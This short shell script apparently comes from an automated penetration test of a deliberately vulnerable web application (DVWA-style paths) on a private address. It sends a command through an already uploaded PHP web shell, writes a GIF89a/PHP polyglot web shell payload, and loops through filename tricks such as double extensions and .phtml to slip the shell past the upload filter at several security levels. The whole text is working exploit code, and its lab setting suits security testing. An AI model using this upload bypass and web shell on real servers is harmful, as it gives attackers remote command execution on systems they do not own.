CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
BASE='http://10.31.0.87:3000'
mkdir -p evidence/upload

curl -s -b "$CK" "$BASE/hackable/uploads/aegis_shell.php?c=whoami" -o evidence/upload/webshell-exec-resp.txt
printf 'GIF89a;\n<?php echo "AEGIS_POLY_OK:"; system($_GET["c"]); ?>\n' > /tmp/poly_payload

for L in medium high; do
  for FN in 'shell.php.png' 'shell.phtml' 'poly.jpg.php' 'poly.php' 'aegis_shell.php'; do
    R=$(curl -s -b "$CK; security=$L" "$BASE/vulnerabilities/upload/" -F "uploaded=@/tmp/poly_payload;filename=$FN;type=image/jpeg" -F "Upload=Upload")
    MS=$(printf '%s' "$R" | grep -oE 'succesfully uploaded|not an image|only accept|cannot|We only accept')
    echo "$L fn=$FN => $MS"
  done
done
